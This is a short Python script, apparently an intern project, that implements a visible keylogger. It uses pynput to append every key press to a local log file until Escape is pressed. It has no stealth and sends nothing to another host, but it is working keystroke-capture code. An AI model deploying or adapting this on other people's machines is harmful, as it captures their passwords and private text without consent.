from pynput import keyboard
import os

# File to save the logged keys (set to the specified directory)
LOG_FILE = r"D:\\manas\\Elite Intern\\key_log.txt"

# Function to write keys to the log file
def write_to_file(key):
    with open(LOG_FILE, "a") as log_file:
        log_file.write(key + "\n")

# Function to handle key press events
def on_press(key):
    try:
        # Handle alphanumeric keys
        write_to_file(f"{key.char}")
    except AttributeError:
        # Handle special keys
        write_to_file(f"{key}")

# Function to handle key release events
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener when 'Escape' key is pressed
        return False

# Main function to start the keylogger
def main():
    print("Keylogger started. Press 'Escape' to stop.")
    print(f"Log file location: {os.path.abspath(LOG_FILE)}")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
